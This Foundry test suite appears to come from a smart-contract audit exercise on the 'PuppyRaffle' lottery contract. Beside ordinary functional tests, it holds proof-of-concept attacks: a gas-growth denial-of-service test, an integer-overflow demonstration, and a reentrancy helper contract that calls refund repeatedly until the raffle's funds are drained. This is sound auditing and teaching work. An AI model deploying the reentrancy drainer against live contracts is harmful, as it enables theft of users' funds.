// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
    }

    //////////////////////
    /// EnterRaffle    ///
    /////////////////////

    function testCanEnterRaffle() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        assertEq(puppyRaffle.players(0), playerOne);
    }

    function testCantEnterWithoutPaying() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle(players);
    }

    function testCanEnterRaffleMany() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
        assertEq(puppyRaffle.players(0), playerOne);
        assertEq(puppyRaffle.players(1), playerTwo);
    }

    function testCantEnterWithoutPayingMultiple() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle{value: entranceFee}(players);
    }

    function testCantEnterWithDuplicatePlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
    }

    function testCantEnterWithDuplicatePlayersMany() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
    }

    //////////////////////
    /// Refund         ///
    /////////////////////
    modifier playerEntered() {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        _;
    }

    function testCanGetRefund() public playerEntered {
        uint256 balanceBefore = address(playerOne).balance;
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(address(playerOne).balance, balanceBefore + entranceFee);
    }

    function testGettingRefundRemovesThemFromArray() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(puppyRaffle.players(0), address(0));
    }

    function testOnlyPlayerCanRefundThemself() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
        vm.expectRevert("PuppyRaffle: Only the player can refund");
        vm.prank(playerTwo);
        puppyRaffle.refund(indexOfPlayer);
    }

    //////////////////////
    /// getActivePlayerIndex         ///
    /////////////////////
    function testGetActivePlayerIndexManyPlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);

        assertEq(puppyRaffle.getActivePlayerIndex(playerOne), 0);
        assertEq(puppyRaffle.getActivePlayerIndex(playerTwo), 1);
    }

    //////////////////////
    /// selectWinner         ///
    /////////////////////
    modifier playersEntered() {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        _;
    }

    function testCantSelectWinnerBeforeRaffleEnds() public playersEntered {
        vm.expectRevert("PuppyRaffle: Raffle not over");
        puppyRaffle.selectWinner();
    }

    function testCantSelectWinnerWithFewerThanFourPlayers() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = address(3);
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        vm.expectRevert("PuppyRaffle: Need at least 4 players");
        puppyRaffle.selectWinner();
    }

    function testSelectWinner() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.previousWinner(), playerFour);
    }

    function testSelectWinnerGetsPaid() public playersEntered {
        uint256 balanceBefore = address(playerFour).balance;

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPayout = ((entranceFee * 4) * 80 / 100);

        puppyRaffle.selectWinner();
        assertEq(address(playerFour).balance, balanceBefore + expectedPayout);
    }

    function testSelectWinnerGetsAPuppy() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.balanceOf(playerFour), 1);
    }

    function testPuppyUriIsRight() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        string memory expectedTokenUri =
            "data:application/json;base64,eyJuYW1lIjoiUHVwcHkgUmFmZmxlIiwgImRlc2NyaXB0aW9uIjoiQW4gYWRvcmFibGUgcHVwcHkhIiwgImF0dHJpYnV0ZXMiOiBbeyJ0cmFpdF90eXBlIjogInJhcml0eSIsICJ2YWx1ZSI6IGNvbW1vbn1dLCAiaW1hZ2UiOiJpcGZzOi8vUW1Tc1lSeDNMcERBYjFHWlFtN3paMUF1SFpqZmJQa0Q2SjdzOXI0MXh1MW1mOCJ9";

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.tokenURI(0), expectedTokenUri);
    }

    //////////////////////
    /// withdrawFees         ///
    /////////////////////
    function testCantWithdrawFeesIfPlayersActive() public playersEntered {
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    function testWithdrawFees() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPrizeAmount = ((entranceFee * 4) * 20) / 100;

        puppyRaffle.selectWinner();
        puppyRaffle.withdrawFees();
        assertEq(address(feeAddress).balance, expectedPrizeAmount);
    }

    function testDosAttack() public{
        vm.txGasPrice(1);

        uint256 playersNumbers = 100;

        address [] memory players = new address[](playersNumbers);

        // Dummy first array of 100
        for(uint256 i =0; i< playersNumbers; i++){
            players[i] = address(i);

        }

        uint256 gasStart1 = gasleft();

        puppyRaffle.enterRaffle{value: entranceFee * playersNumbers}(players);

        uint256 gasEnd1 = gasleft();
        
        // gas used For First 100 plyaers enetrance 
        uint256 gasUsed1 = gasStart1 - gasEnd1;


        address [] memory players2 = new address[](playersNumbers);

        for(uint256 i =0; i< playersNumbers; i++){
            players2[i] = address(i+playersNumbers);

        }

        uint256 gasStart2 = gasleft();

        puppyRaffle.enterRaffle{value: entranceFee * playersNumbers}(players2);

        uint256 gasEnd2 = gasleft();

        // gas used For Second 100 plyaers enetrance 
        uint256 gasUsed2 = gasStart2 - gasEnd2;
        console.log("Gas Used For First 100 Players enterance", gasUsed1);
        console.log("Gas Used For Second 100 Players enterance", gasUsed2);


        assert(gasUsed2> gasUsed1);

    }


    function testreentractyAttckTest() public{
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        uint256 startingPuffyRaffleBalance = address(puppyRaffle).balance;

        address attacker = makeAddr("attacker");

        vm.deal(attacker, 2 ether);

        ReentraceyAttackOnPuppyRaffle  reeentraceAttacker = new ReentraceyAttackOnPuppyRaffle(address(puppyRaffle),entranceFee);

        uint256 startingAttackerContractBalance = address(reeentraceAttacker).balance;

        // attakce

        vm.prank(attacker);
        reeentraceAttacker.atttack{value:entranceFee}();

        uint256 endingBalanceOfAttackerContract = address(reeentraceAttacker).balance;
        uint256 endingBalanceOfpuppyContract = address(puppyRaffle).balance;

        console.log("Attacker Balance Before Attack", startingAttackerContractBalance);

        console.log("Puupyy Balance Before Attack", startingPuffyRaffleBalance);

        console.log("Ending Blance Of Attaker Contarct",endingBalanceOfAttackerContract);
        console.log("Ending Blance Of Puppy Contarct",endingBalanceOfpuppyContract);

        assert(address(puppyRaffle).balance==0);

    }



    function testOveFlow () public {

        OverFlow overFlow = new OverFlow();

        overFlow.increment(255);
        console.log("Highest Value in Uint8",overFlow.amount());
        assert(overFlow.amount()==255);

        // Now If We try  to Add More One In The Amount Then it Will Set To zero 
        // Like 255+ 1 =0; as uint8 has 2^8-1 = 255 which highest value in iteger it can store 

         overFlow.increment(1);
        console.log("Overflown After Addition Value in Uint8",overFlow.amount());
        assert(overFlow.amount()==0);


    }
}



// Helper Contracts
contract ReentraceyAttackOnPuppyRaffle {

    PuppyRaffle puppyRafle;

    uint256 attackerIndex;

    uint256 enteranceFee;

    constructor(address _puppyRaffle, uint256 _entranceFee){
        puppyRafle = PuppyRaffle(_puppyRaffle);
        enteranceFee = _entranceFee;
    }

    function atttack() external payable{
        address[] memory attackers = new address[](1);
        attackers[0] = address(this);
        puppyRafle.enterRaffle{value:enteranceFee}(attackers);

        attackerIndex = puppyRafle.getActivePlayerIndex(address(this));

        puppyRafle.refund(attackerIndex);
    }

    function _steal() internal {
        if(address(puppyRafle).balance >= enteranceFee){
            puppyRafle.refund(attackerIndex);
        }
    }

    fallback() external payable {
        _steal();
    }

    receive() external payable {
        _steal();
    }
}

contract OverFlow{
    uint8 public amount;

    function increment(uint8 _number) public{
        amount = amount + _number;
    }
}